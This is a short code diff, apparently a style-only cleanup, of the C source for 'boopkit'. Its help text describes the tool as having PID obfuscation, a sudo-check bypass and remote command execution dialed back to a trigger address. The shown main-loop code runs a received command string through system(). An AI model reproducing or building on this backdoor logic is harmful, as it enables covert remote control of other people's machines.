@@ -50,7 +50,9 @@ void usage() {
   boopprintf("Options:\n");
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  boopprintf("-l, local-only     Disable dialing the trigger program source address for RCE.\n");
+  boopprintf(
+      "-l, local-only     Disable dialing the trigger program source address "
+      "for RCE.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
@@ -365,12 +367,11 @@ int main(int argc, char **argv) {
             system(rce);
           }
           free(rce);
-        }else if (strlen(ret.rce) >0 ){
+        } else if (strlen(ret.rce) > 0) {
           boopprintf("  <- Executing: %s\r\n", ret.rce);
           system(ret.rce);
           boopprintf("  -> no RCE found!\n");
         }
-
       }
       err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
